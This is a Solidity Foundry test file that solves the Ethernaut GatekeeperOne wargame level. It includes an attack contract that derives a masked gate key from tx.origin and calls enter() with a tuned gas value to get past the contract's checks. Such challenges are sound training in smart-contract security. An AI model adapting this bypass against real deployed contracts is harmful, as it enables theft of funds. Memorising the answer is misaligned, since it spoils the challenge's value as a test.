// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/GatekeeperOne/GatekeeperOne.sol";
import "levels/GatekeeperOne/GatekeeperOneFactory.sol";
import "./utils/EthernautTest.sol";

contract GatekeeperOneHack {
    GatekeeperOne public victim;

    constructor(address _targetAddress) {
        victim = GatekeeperOne(_targetAddress);
    }

    function exploit() external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        address(victim).call{gas: 268 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
}

contract GatekeeperOneTest is Test {
    function test_gatekeeperone() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        address levelAddress = ethernautTest.setup(gatekeeperOneFactory);

        // Exploit
        GatekeeperOneHack gatekeeperOneHack = new GatekeeperOneHack(levelAddress);
        gatekeeperOneHack.exploit();

        // Submit
        ethernautTest.submit();
    }
}
